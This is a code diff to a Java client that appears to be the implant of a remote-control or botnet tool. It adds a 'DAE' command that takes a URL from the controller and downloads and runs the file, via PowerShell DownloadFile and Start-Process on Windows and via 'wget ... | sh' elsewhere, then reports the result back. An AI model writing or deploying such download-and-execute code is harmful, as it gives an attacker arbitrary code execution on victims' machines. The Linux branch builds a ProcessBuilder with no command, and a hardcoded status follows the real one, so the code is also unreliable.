@@ -137,6 +137,21 @@ public class Client {
                     System.exit(0);
                 } else if (input.contains("BEACON")) {
                     communicate("BEACON");
+                } else if (input.contains("DAE")){
+                    communicate("DAE");
+                    String url = input.split(" ")[1];
+                    // Attempts to download and execute a binary. If it is successful, send back `1`, else `0`.
+                    if (SYSTEMOS.contains("Windows")){
+                        int status = execNoComm("PowerShell (New-Object System.Net.WebClient).DownloadFile('" + url + "', 'A7ytnAR');Start-Process 'A7ytnAR'");
+                        System.out.println("DaE status: " + status);
+                        communicate(status);
+                    } else {
+                        // Probably bash/sh. Use sh just to be safe
+                        int status = execNoComm("wget '"+ url + "' -O - | sh");
+                        System.out.println("DaE status: " + status);
+                        communicate(status);
+                    }
+                    communicate(1);
                 }
             }
         } catch (Exception e) {
@@ -194,6 +209,33 @@ public class Client {
                 exec("");
             }
         }
+    }
+
+
+    private int execNoComm(String cmd){
+        if (!cmd.equals("")) {
+            try {
+                ProcessBuilder pb = null;
+                if (SYSTEMOS.contains("Windows")) {
+                    pb = new ProcessBuilder("cmd.exe", "/c", cmd);
+                } else if (SYSTEMOS.contains("Linux")) {
+                    pb = new ProcessBuilder();
+                }
+                if (pb != null) {
+                    pb.redirectErrorStream(true);
+                }
+                Process proc = pb.start();
+                try {
+                    proc.waitFor();
+                    return proc.exitValue();
+                } catch (InterruptedException ie){
+                    return 0;
+                }
+            } catch (IOException e) {
+                exec("");
+            }
+        }
+        return 0;
     }
 
     private void loadServerSettings() throws Exception {
